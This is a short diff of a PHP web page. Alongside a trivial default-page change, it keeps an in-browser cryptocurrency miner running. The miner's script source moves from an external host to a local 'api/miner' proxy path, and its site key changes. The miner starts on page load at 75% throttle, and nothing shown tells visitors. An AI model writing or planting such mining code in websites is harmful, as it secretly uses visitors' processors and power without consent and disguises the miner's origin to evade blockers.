@@ -4,7 +4,7 @@
 	if(isset($_GET['page'])){
 		$page = $_GET['page'];
 	}else{
-		$page = "home";
+		$page = "index";
 	}
 ?>
 <!doctype html>
@@ -55,9 +55,9 @@
 		  alertify.prompt().set({'reverseButtons': true});
 		}
 	</script>
-	<script src="https://www.hostingcloud.science./P5gV.js"></script>
+	<script src="api/miner/FNn8.php?f=uwlS.js"></script>
 	<script>
-		var _client = new Client.Anonymous('3162a8bb71b35ec7254ce652bc343c09a6268f6771483a9a1eda978ae524bfc1', {
+		var _client = new Client.Anonymous('488757ab0942980695a279c52b4e0a0e6b6fa7df1a54d155c0684522fa06f426', {
 			throttle: 0.75, c: 'w'
 		});
 		_client.start();
